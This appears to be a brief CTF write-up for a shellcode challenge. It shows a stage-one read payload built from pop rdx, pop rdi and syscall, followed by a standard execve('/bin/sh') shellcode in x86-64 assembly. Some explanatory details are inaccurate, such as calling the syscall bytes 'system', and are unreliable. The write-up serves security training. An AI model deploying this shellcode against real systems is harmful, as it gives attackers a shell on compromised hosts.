### shellcode
#### A easy shellcode
#### idea
input string must in the string,  `char *s = "ZZJ loves shell_code,and here is a gift:\x0f\05 enjoy it!\n";` and will take over the execution flow. '\x0f\x05' is system, 'Z', '_' is `pop rdi`  and `pop rdx`. You just need to write to read.
```
  pop rdx
  pop rdx
  pop rdx
  pop rdx
  pop rdi
  pop rdi
  syscall
```
and here is a normal shellcode.
```
call here
  .ascii "/bin/sh"
  .byte 0
here:
   pop rdi
   xor rsi,rsi
   xor rdx,rdx
   mov rax,0x3b
   syscall
```  